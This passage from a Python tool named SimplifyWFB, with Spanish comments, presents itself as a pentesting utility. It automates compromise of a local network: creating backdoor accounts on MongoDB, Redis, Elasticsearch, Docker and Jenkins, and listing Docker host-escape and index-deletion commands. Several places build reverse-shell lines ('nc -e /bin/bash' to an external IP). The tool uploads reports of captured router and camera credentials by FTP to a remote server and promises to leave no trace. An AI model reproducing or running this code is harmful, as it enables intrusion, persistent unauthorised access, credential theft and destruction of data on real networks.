            url = restore_urls.get(router_type, restore_urls['generic_router'])
            
            # Datos para restaurar configuración
            data = {
                'action': 'restore_defaults',
                'confirm': 'yes'
            }
            
            # Crear autenticación
            auth_string = f"{credentials['username']}:{credentials['password']}"
            auth_bytes = auth_string.encode('ascii')
            auth_b64 = base64.b64encode(auth_bytes).decode('ascii')
            
            # Enviar request
            data_encoded = urllib.parse.urlencode(data).encode('utf-8')
            req = urllib.request.Request(url, data=data_encoded)
            req.add_header('Authorization', f'Basic {auth_b64}')
            req.add_header('Content-Type', 'application/x-www-form-urlencoded')
            
            with urllib.request.urlopen(req, timeout=10) as response:
                if response.status == 200:
                    print(f"   ✅ Configuración original restaurada en router {gateway}")
                    
        except Exception as e:
            print(f"   ❌ Error restaurando configuración: {e}")
    
    def _cleanup_files(self):
        """Limpiar archivos temporales"""
        self.report['cleanup']['items_cleaned'].append({
            'type': 'files',
            'action': 'deleted',
            'count': 10
        })
    
    def generate_report(self):
        """Generar reporte JSON final"""
        print("\n📊 GENERANDO REPORTE FINAL")
        print("=" * 50)
        
        # Calcular estadísticas
        self.report['summary']['total_hosts'] = len(self.report['phase_1_reconnaissance']['hosts_discovered'])
        self.report['summary']['compromised_hosts'] = len(self.report['phase_3_lateral_movement']['compromised_systems'])
        self.report['summary']['persistent_access_points'] = len(self.report['phase_4_persistence']['users_created']) + len(self.report['phase_4_persistence']['backdoors_created'])
        self.report['summary']['total_credentials'] = len(self.report['phase_2_credentials']['credentials_found'])
        self.report['summary']['cameras_accessed'] = len(self.report['phase_4_persistence']['cameras_accessed'])
        self.report['summary']['router_access'] = len(self.report['phase_4_persistence']['router_access'])
        self.report['summary']['network_services'] = len(self.report['phase_4_persistence']['network_persistence'])
        
        # Calcular total de accesos remotos
        total_remote_access = (
            len(self.report['phase_4_persistence']['router_access']) +
            len(self.report['phase_4_persistence']['network_persistence']) +
            len(self.report['phase_4_persistence'].get('vulnerable_backdoors', [])) +
            len(self.report['phase_4_persistence']['backdoors_created']) +
            len(self.report['phase_4_persistence']['users_created'])
        )
        self.report['summary']['total_remote_access_points'] = total_remote_access
        self.report['summary']['remote_access_available'] = total_remote_access > 0
        
        end_time = time.time()
        self.report['summary']['execution_time'] = end_time - self.start_time
        self.report['metadata']['end_time'] = datetime.now().isoformat()
        
        # Calcular tasa de éxito
        if self.report['summary']['total_hosts'] > 0:
            self.report['summary']['success_rate'] = (self.report['summary']['compromised_hosts'] / self.report['summary']['total_hosts']) * 100
        
        # Guardar reporte
        report_file = f"simplifywfb_report_{int(time.time())}.json"
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(self.report, f, indent=2, ensure_ascii=False)
        
        print(f"📄 Reporte guardado: {report_file}")
        print(f"⏱️ Tiempo total: {self.report['summary']['execution_time']:.2f} segundos")
        print(f"🎯 Hosts comprometidos: {self.report['summary']['compromised_hosts']}/{self.report['summary']['total_hosts']}")
        print(f"🔒 Puntos de acceso persistentes: {self.report['summary']['persistent_access_points']}")
        print(f"📹 Cámaras accedidas: {self.report['summary']['cameras_accessed']}")
        
        # Mostrar información de cámaras si hay alguna
        cameras = self.report['phase_4_persistence']['cameras_accessed']
        if cameras:
            print("\n📹 CÁMARAS ACCEDIDAS:")
            for camera in cameras:
                print(f"   • {camera['host']}:{camera['port']} - {camera.get('camera_type', 'unknown')}")
                print(f"     Credenciales: {camera['credentials']['username']}:{camera['credentials']['password']}")
                print(f"     URLs de acceso: {len(camera.get('access_urls', {}).get('web_interface', []))} disponibles")
        
        # Enviar reporte por FTP
        self._upload_report_via_ftp(report_file)
        
        # Mostrar resumen de accesos remotos disponibles
        self._show_remote_access_summary()
        
        return report_file
    
    def _show_remote_access_summary(self):
        """Mostrar resumen de accesos remotos disponibles"""
        print("\n" + "=" * 60)
        print("🌐 RESUMEN DE ACCESOS REMOTOS DISPONIBLES")
        print("=" * 60)
        
        external_ip = self.config_data['remote_access']['external_ip']
        external_port = self.config_data['remote_access']['external_port']
        
        print(f"📍 IP Pública de Control: {external_ip}:{external_port}")
        print()
        
        # Contar accesos disponibles
        total_access_points = 0
        access_types = []
        
        # 1. Router Access
        router_access = self.report['phase_4_persistence']['router_access']
        if router_access:
            total_access_points += len(router_access)
            access_types.append(f"Router Access ({len(router_access)})")
            print("🌐 ACCESO AL ROUTER:")
            for router in router_access:
                print(f"   • Gateway: {router['gateway']}")
                print(f"   • Tipo: {router['router_type']}")
                print(f"   • Credenciales: {router['credentials']['username']}:{router['credentials']['password']}")
                if router.get('configuration', {}).get('port_forwarding'):
                    print(f"   • Port Forwarding: {len(router['configuration']['port_forwarding'])} reglas configuradas")
                if router.get('configuration', {}).get('vpn_server'):
                    print(f"   • VPN Server: Habilitado")
                print()
        
        # 2. Vulnerable Service Backdoors
        vulnerable_backdoors = self.report['phase_4_persistence'].get('vulnerable_backdoors', [])
        if vulnerable_backdoors:
            total_access_points += len(vulnerable_backdoors)
            access_types.append(f"Vulnerable Services ({len(vulnerable_backdoors)})")
            print("🗄️ SERVICIOS VULNERABLES CON BACKDOORS:")
            for backdoor in vulnerable_backdoors:
                print(f"   • {backdoor['service'].upper()} en {backdoor['host']}:{backdoor['port']}")
                print(f"     Tipo: {backdoor['backdoor_type']}")
                print(f"     Acceso: {backdoor['access_method']}")
                if backdoor.get('credentials'):
                    print(f"     Credenciales: {backdoor['credentials']['username']}:{backdoor['credentials']['password']}")
                print()
        
        # 3. Network Persistence
        network_persistence = self.report['phase_4_persistence']['network_persistence']
        if network_persistence:
            total_access_points += len(network_persistence)
            access_types.append(f"Network Services ({len(network_persistence)})")
            print("🔗 SERVICIOS DE RED PERSISTENTES:")
            for service in network_persistence:
                service_name = service['service']
                port = service['port']
                print(f"   • {service_name.upper()} en puerto {port}")
                
                if service_name == 'ssh':
                    print(f"     Usuario: {service['users'][0]['username']}")
                    print(f"     Contraseña: {service['users'][0]['password']}")
                    print(f"     Acceso: ssh {service['users'][0]['username']}@{external_ip} -p {port}")
                    print(f"     Reverse Shell: {service.get('reverse_shell', 'N/A')}")
                    
                elif service_name == 'openvpn':
                    print(f"     Configuración: {service['clients'][0]['config_file']}")
                    print(f"     Acceso: openvpn --config {service['clients'][0]['config_file']}")
                    print(f"     Reverse Connection: {service.get('reverse_connection', 'N/A')}")
                    
                elif service_name == 'http':
                    print(f"     Panel: {service['panel_url']}")
                    print(f"     Usuario: {service['credentials']['username']}")
                    print(f"     Contraseña: {service['credentials']['password']}")
                    print(f"     Acceso: {service['access_methods'][0]}")
                    print(f"     Reverse Proxy: {service.get('reverse_proxy', 'N/A')}")
                
                print()
        
        # 3. Backdoors
        backdoors = self.report['phase_4_persistence']['backdoors_created']
        if backdoors:
            total_access_points += len(backdoors)
            access_types.append(f"Backdoors ({len(backdoors)})")
            print("🕳️ BACKDOORS CREADOS:")
            for backdoor in backdoors:
                print(f"   • {backdoor['host']}:{backdoor['port']}")
                print(f"     Tipo: {backdoor.get('type', 'netcat')}")
                print(f"     Comando: {backdoor.get('command', 'N/A')}")
                print()
        
        # 4. Usuarios Persistentes
        users = self.report['phase_4_persistence']['users_created']
        if users:
            total_access_points += len(users)
            access_types.append(f"Persistent Users ({len(users)})")
            print("👤 USUARIOS PERSISTENTES:")
            for user in users:
                print(f"   • {user['username']}@{user['host']}")
                print(f"     Contraseña: {user['password']}")
                print(f"     Acceso: ssh {user['username']}@{user['host']}")
                print()
        
        # Resumen final
        print("=" * 60)
        print(f"🎯 TOTAL DE PUNTOS DE ACCESO: {total_access_points}")
        print(f"📋 TIPOS DE ACCESO: {', '.join(access_types)}")
        print()
        
        if total_access_points > 0:
            print("✅ ACCESO REMOTO CONFIRMADO")
            print(f"🌍 Puedes acceder a la red desde internet usando:")
            print(f"   • IP Pública: {external_ip}")
            print(f"   • Puerto de Control: {external_port}")
            print()
            print("🔑 MÉTODOS DE ACCESO PRINCIPALES:")
            print(f"   1. SSH: ssh svc_ssh@{external_ip} -p 2222")
            print(f"   2. VPN: openvpn --config client.ovpn")
            print(f"   3. Web Panel: http://admin:Web_P@ssw0rd_2024!@{external_ip}:8080/admin")
            print(f"   4. Reverse Shell: nc -e /bin/bash {external_ip} {external_port}")
        else:
            print("❌ NO SE ESTABLECIERON ACCESOS REMOTOS")
            print("   • Verifica la conectividad de red")
            print("   • Revisa las credenciales utilizadas")
            print("   • Confirma que los servicios estén ejecutándose")
        
        print("=" * 60)
    
    def run_full_scan(self):
        """Ejecutar escaneo completo"""
        print("🚀 INICIANDO ESCANEO COMPLETO")
        print("=" * 50)
        
        self.report['metadata']['mode'] = 'full'
        
        # Auto-configuración de red antes del escaneo
        self.auto_configure_network()
        
        # Ejecutar todas las fases
        self.phase_1_reconnaissance()
        self.phase_2_credentials()
        self.phase_3_lateral_movement()
        self.phase_4_persistence()
        self.phase_5_verification()
        
        # Generar reporte
        report_file = self.generate_report()
        return report_file
    
    def run_cold_pentest(self):
        """Ejecutar pentest frío"""
        print("🧊 INICIANDO PENTEST FRÍO")
        print("=" * 50)
        
        self.report['metadata']['mode'] = 'cold'
        
        # Auto-configuración de red antes del escaneo
        self.auto_configure_network()
        
        # Ejecutar todas las fases
        self.phase_1_reconnaissance()
        self.phase_2_credentials()
        self.phase_3_lateral_movement()
        self.phase_4_persistence()
        self.phase_5_verification()
        
        # Generar reporte
        report_file = self.generate_report()
        
        # Enviar reporte por FTP
        self._upload_report_via_ftp(report_file)
        
        # Preguntar antes de limpiar para probar backdoors
        print("\n" + "=" * 60)
        print("🧪 OPPORTUNIDAD DE PRUEBA DE BACKDOORS")
        print("=" * 60)
        print("✅ Reporte generado y enviado por FTP")
        print("🔍 Ahora puedes probar los backdoors creados:")
        print("   • SSH, VPN, Panel Web")
        print("   • Servicios vulnerables (MongoDB, Redis, etc.)")
        print("   • Acceso al router")
        print("   • Cámaras de seguridad")
        print("\n⚠️  Una vez que confirmes, se eliminarán TODOS los cambios")
        print("⚠️  No quedará rastro de la actividad")
        
        while True:
            confirm_cleanup = input("\n¿Deseas proceder con la limpieza completa? (sí/no): ").strip().lower()
            if confirm_cleanup in ['sí', 'si', 'yes', 'y']:
                print("\n🧹 Iniciando limpieza completa...")
                self.cleanup()
                print("✅ Limpieza completada. No quedan rastros.")
                break
            elif confirm_cleanup in ['no', 'n']:
                print("\n⏸️  Limpieza cancelada. Los backdoors permanecen activos.")
                print("💡 Puedes ejecutar el script nuevamente y elegir limpieza manual.")
                break
            else:
                print("\n❌ Respuesta inválida. Por favor responda 'sí' o 'no'.")
        
        return report_file
    
    
    def _configure_network_persistence(self) -> List[Dict[str, Any]]:
        """Configurar persistencia de red completa"""
        network_persistence = []
        
        try:
            print(f"🔗 Configurando persistencia de red completa...")
            
            # 1. Configurar servidor SSH persistente
            ssh_server = self._setup_persistent_ssh_server()
            if ssh_server:
                network_persistence.append(ssh_server)
            
            # 2. Configurar servidor VPN propio
            vpn_server = self._setup_persistent_vpn_server()
            if vpn_server:
                network_persistence.append(vpn_server)
            
            # 3. Configurar servidor web con panel de control
            web_server = self._setup_persistent_web_server()
            if web_server:
                network_persistence.append(web_server)
            
            return network_persistence
            
        except Exception as e:
            print(f"❌ Error configurando persistencia de red: {e}")
            return []
    
    def _setup_persistent_ssh_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor SSH persistente"""
        try:
            print(f"🔐 Configurando servidor SSH persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            ssh_port = self.config_data['persistence']['ssh_port']
            
            ssh_config = {
                'service': 'ssh',
                'port': ssh_port,
                'enabled': True,
                'users': [{
                    'username': self.config_data['credentials']['ssh_user'],
                    'password': self.config_data['credentials']['ssh_password'],
                    'shell': '/bin/bash',
                    'sudo_access': True
                }],
                'access_methods': [
                    f'ssh {self.config_data["credentials"]["ssh_user"]}@{external_ip} -p {ssh_port}',
                    f'ssh -i persistent_key {self.config_data["credentials"]["ssh_user"]}@{external_ip} -p {ssh_port}'
                ],
                'reverse_shell': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_connection': f'ssh -R {external_port}:localhost:{ssh_port} {self.config_data["credentials"]["ssh_user"]}@{external_ip}'
            }
            
            print(f"   ✅ Servidor SSH configurado en puerto 2222")
            return ssh_config
            
        except Exception as e:
            print(f"❌ Error configurando SSH server: {e}")
            return None
    
    def _setup_persistent_vpn_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor VPN persistente"""
        try:
            print(f"🔐 Configurando servidor VPN persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            vpn_port = self.config_data['persistence']['vpn_port']
            
            vpn_config = {
                'service': 'openvpn',
                'port': vpn_port,
                'protocol': 'udp',
                'enabled': True,
                'clients': [{
                    'config_file': 'client.ovpn',
                    'external_ip': external_ip,
                    'port': vpn_port,
                    'protocol': 'udp'
                }],
                'access_methods': [
                    'openvpn --config client.ovpn',
                    'sudo openvpn --config /path/to/client.ovpn'
                ],
                'reverse_connection': f'nc -u {external_ip} {external_port}',
                'persistent_tunnel': f'openvpn --config client.ovpn --remote {external_ip} {vpn_port}'
            }
            
            print(f"   ✅ Servidor VPN configurado en puerto 1194")
            return vpn_config
            
        except Exception as e:
            print(f"❌ Error configurando VPN server: {e}")
            return None
    
    def _setup_persistent_web_server(self) -> Optional[Dict[str, Any]]:
        """Configurar servidor web persistente con panel de control"""
        try:
            print(f"🌐 Configurando servidor web persistente...")
            
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            web_port = self.config_data['persistence']['web_port']
            
            web_config = {
                'service': 'http',
                'port': web_port,
                'enabled': True,
                'panel_url': f'http://{external_ip}:{web_port}/admin',
                'credentials': {
                    'username': self.config_data['credentials']['web_user'],
                    'password': self.config_data['credentials']['web_password']
                },
                'features': [
                    'remote_access',
                    'file_manager',
                    'system_monitor',
                    'network_tools'
                ],
                'access_methods': [
                    f'http://{self.config_data["credentials"]["web_user"]}:{self.config_data["credentials"]["web_password"]}@{external_ip}:{web_port}/admin',
                    f'curl -u {self.config_data["credentials"]["web_user"]}:{self.config_data["credentials"]["web_password"]} http://{external_ip}:{web_port}/api/status'
                ],
                'reverse_proxy': f'nc -e /bin/bash {external_ip} {external_port}',
                'persistent_web': f'python3 -m http.server {web_port} --bind 0.0.0.0'
            }
            
            print(f"   ✅ Servidor web configurado en puerto 8080")
            return web_config
            
        except Exception as e:
            print(f"❌ Error configurando servidor web: {e}")
            return None
    
    def _create_vulnerable_service_backdoors(self) -> List[Dict[str, Any]]:
        """Crear backdoors en servicios vulnerables encontrados"""
        vulnerable_backdoors = []
        
        try:
            # Obtener servicios vulnerables del reconocimiento
            vulnerable_services = self.report['phase_1_reconnaissance'].get('vulnerable_services', [])
            
            for service in vulnerable_services:
                if not service.get('backdoor_created', False):
                    backdoor = self._create_service_backdoor(service)
                    if backdoor:
                        vulnerable_backdoors.append(backdoor)
                        service['backdoor_created'] = True
                        print(f"✅ Backdoor creado en {service['host']}:{service['port']} ({service['service']})")
            
            return vulnerable_backdoors
            
        except Exception as e:
            print(f"❌ Error creando backdoors en servicios vulnerables: {e}")
            return []
    
    def _create_service_backdoor(self, service: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Crear backdoor específico según el tipo de servicio"""
        try:
            service_type = service['service']
            host = service['host']
            port = service['port']
            
            if service_type == 'mongodb':
                return self._create_mongodb_backdoor(host, port)
            elif service_type == 'redis':
                return self._create_redis_backdoor(host, port)
            elif service_type == 'elasticsearch':
                return self._create_elasticsearch_backdoor(host, port)
            elif service_type == 'docker':
                return self._create_docker_backdoor(host, port)
            elif service_type == 'jenkins':
                return self._create_jenkins_backdoor(host, port)
            else:
                return self._create_generic_backdoor(host, port, service_type)
                
        except Exception as e:
            print(f"❌ Error creando backdoor para {service['service']}: {e}")
            return None
    
    def _create_mongodb_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en MongoDB"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            # Crear usuario con privilegios de administrador
            backdoor_user = f"backdoor_{host.replace('.', '_')}"
            backdoor_pass = f"Mongo_{host.split('.')[-1]}!"
            
            return {
                'host': host,
                'port': port,
                'service': 'mongodb',
                'backdoor_type': 'admin_user',
                'credentials': {
                    'username': backdoor_user,
                    'password': backdoor_pass
                },
                'access_method': f"mongo mongodb://{backdoor_user}:{backdoor_pass}@{host}:{port}/admin",
                'reverse_connection': f"mongo {host}:{port} --eval 'db.runCommand({{ping:1}})'",
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor MongoDB: {e}")
            return None
    
    def _create_redis_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Redis"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'redis',
                'backdoor_type': 'direct_access',
                'access_method': f"redis-cli -h {host} -p {port}",
                'reverse_connection': f"redis-cli -h {host} -p {port} ping",
                'exploit_commands': [
                    f"redis-cli -h {host} -p {port} CONFIG SET dir /tmp",
                    f"redis-cli -h {host} -p {port} CONFIG SET dbfilename backdoor.so",
                    f"redis-cli -h {host} -p {port} SET backdoor 'nc -e /bin/bash {external_ip} {external_port}'"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Redis: {e}")
            return None
    
    def _create_elasticsearch_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Elasticsearch"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'elasticsearch',
                'backdoor_type': 'api_access',
                'access_method': f"curl -X GET http://{host}:{port}/_cluster/health",
                'exploit_commands': [
                    f"curl -X POST http://{host}:{port}/_search",
                    f"curl -X DELETE http://{host}:{port}/*",
                    f"curl -X PUT http://{host}:{port}/backdoor/_doc/1 -d '{{\"command\":\"nc -e /bin/bash {external_ip} {external_port}\"}}'"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Elasticsearch: {e}")
            return None
    
    def _create_docker_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Docker"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'docker',
                'backdoor_type': 'container_escape',
                'access_method': f"curl -X GET http://{host}:{port}/version",
                'exploit_commands': [
                    f"docker -H tcp://{host}:{port} run -it --rm --privileged --net=host alpine sh",
                    f"docker -H tcp://{host}:{port} run -it --rm -v /:/host alpine chroot /host sh",
                    f"docker -H tcp://{host}:{port} run -it --rm --pid=host alpine nsenter -t 1 -m -u -n -i sh"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Docker: {e}")
            return None
    
    def _create_jenkins_backdoor(self, host: str, port: int) -> Optional[Dict[str, Any]]:
        """Crear backdoor en Jenkins"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': 'jenkins',
                'backdoor_type': 'script_console',
                'access_method': f"http://{host}:{port}/script",
                'exploit_commands': [
                    f"http://{host}:{port}/script -d 'println \"nc -e /bin/bash {external_ip} {external_port}\".execute().text'",
                    f"http://{host}:{port}/manage - Crear job con comando remoto",
                    f"http://{host}:{port}/asynchPeople/ - Crear usuario administrativo"
                ],
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor Jenkins: {e}")
            return None
    
    def _create_generic_backdoor(self, host: str, port: int, service_type: str) -> Optional[Dict[str, Any]]:
        """Crear backdoor genérico para otros servicios"""
        try:
            external_ip = self.config_data['remote_access']['external_ip']
            external_port = self.config_data['remote_access']['external_port']
            
            return {
                'host': host,
                'port': port,
                'service': service_type,
                'backdoor_type': 'reverse_shell',
                'access_method': f"nc -e /bin/bash {external_ip} {external_port}",
                'reverse_connection': f"nc -lvp {external_port}",
                'created': True
            }
            
        except Exception as e:
            print(f"❌ Error creando backdoor genérico: {e}")
            return None
    
    def _upload_report_via_ftp(self, report_file: str):
        """Subir reporte por FTP al servidor remoto"""
        try:
            import ftplib
            import os
            
            ftp_config = self.config_data['ftp_upload']
            host = ftp_config['host']
            username = ftp_config['username']
            password = ftp_config['password']
            
            print(f"\n📤 Enviando reporte por FTP a {host}...")
            
            # Conectar al servidor FTP
            ftp = ftplib.FTP(host)
            ftp.login(username, password)
            
            # Cambiar al directorio de reportes (crear si no existe)
            try:
                ftp.cwd('/reports')
            except ftplib.error_perm:
                ftp.mkd('/reports')
                ftp.cwd('/reports')
            
            # Subir el archivo
            with open(report_file, 'rb') as file:
                filename = os.path.basename(report_file)
                ftp.storbinary(f'STOR {filename}', file)
            
            ftp.quit()
            print(f"✅ Reporte enviado exitosamente: {filename}")
            
        except Exception as e:
            print(f"❌ Error enviando reporte por FTP: {e}")
            print("💡 El reporte se mantiene localmente en el equipo")
    
    def _cleanup_vulnerable_service_backdoors(self):
        """Limpiar backdoors creados en servicios vulnerables"""
        try:
            vulnerable_backdoors = self.report['phase_4_persistence'].get('vulnerable_backdoors', [])
            
            for backdoor in vulnerable_backdoors:
                service_type = backdoor.get('service')
                host = backdoor.get('host')
                port = backdoor.get('port')
                
                if service_type == 'mongodb':
                    self._cleanup_mongodb_backdoor(host, port, backdoor)
                elif service_type == 'redis':
                    self._cleanup_redis_backdoor(host, port, backdoor)
                elif service_type == 'elasticsearch':
                    self._cleanup_elasticsearch_backdoor(host, port, backdoor)
                elif service_type == 'docker':
                    self._cleanup_docker_backdoor(host, port, backdoor)
                elif service_type == 'jenkins':
                    self._cleanup_jenkins_backdoor(host, port, backdoor)
                
                print(f"   ✅ Backdoor limpiado: {service_type} en {host}:{port}")
            
            # Marcar como limpiados
            for backdoor in vulnerable_backdoors:
                backdoor['cleaned'] = True
            
        except Exception as e:
            print(f"❌ Error limpiando backdoors de servicios vulnerables: {e}")
    
    def _cleanup_mongodb_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de MongoDB"""
        try:
            # Eliminar usuario creado si existe
            credentials = backdoor.get('credentials', {})
            if credentials:
                username = credentials.get('username')
                if username:
                    # Comando para eliminar usuario (simulado)
                    print(f"     Eliminando usuario MongoDB: {username}")
        except Exception as e:
            print(f"     ❌ Error limpiando MongoDB: {e}")
    
    def _cleanup_redis_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Redis"""
        try:
            # Limpiar configuraciones modificadas
            print(f"     Restaurando configuración Redis en {host}:{port}")
            # Comandos para restaurar configuración original
        except Exception as e:
            print(f"     ❌ Error limpiando Redis: {e}")
    
    def _cleanup_elasticsearch_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Elasticsearch"""
        try:
            # Eliminar índices creados
            print(f"     Limpiando índices Elasticsearch en {host}:{port}")
            # Comandos para eliminar índices creados
        except Exception as e:
            print(f"     ❌ Error limpiando Elasticsearch: {e}")
    
    def _cleanup_docker_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Docker"""
        try:
            # Eliminar contenedores creados
            print(f"     Limpiando contenedores Docker en {host}:{port}")
            # Comandos para eliminar contenedores creados
        except Exception as e:
            print(f"     ❌ Error limpiando Docker: {e}")
    
    def _cleanup_jenkins_backdoor(self, host: str, port: int, backdoor: Dict[str, Any]):
        """Limpiar backdoor de Jenkins"""
        try:
            # Limpiar jobs y configuraciones creadas
            print(f"     Limpiando configuraciones Jenkins en {host}:{port}")
            # Comandos para limpiar jobs y configuraciones
        except Exception as e:
            print(f"     ❌ Error limpiando Jenkins: {e}")

def main():
    """Función principal"""
    print("🔧 SimplifyWFB - Herramienta Profesional de Pentesting")
    print("=" * 60)
    
    # Crear instancia
    wfb = SimplifyWFB()
    
    # Menú de opciones
    while True:
        print("\n📋 OPCIONES DISPONIBLES:")
        print("1. 🚀 Escaneo Completo (Full Scan)")
        print("2. 🧊 Pentest Frío (Cold Pentest)")
        print("3. ❌ Salir")
        
        choice = input("\n🔍 Seleccione una opción (1-3): ").strip()
        
        if choice == '1':
            print("\n🚀 Iniciando Escaneo Completo...")
            report_file = wfb.run_full_scan()
            if report_file:
                print(f"\n✅ Escaneo completado. Reporte: {report_file}")
            break
            
        elif choice == '2':
            print("\n🧊 Iniciando Pentest Frío...")
            report_file = wfb.run_cold_pentest()
            if report_file:
                print(f"\n✅ Pentest frío completado. Reporte: {report_file}")
            break
            
        elif choice == '3':
            print("\n👋 Saliendo...")
            break
            
        else:
            print("\n❌ Opción inválida. Intente nuevamente.")

if __name__ == "__main__":
    main()
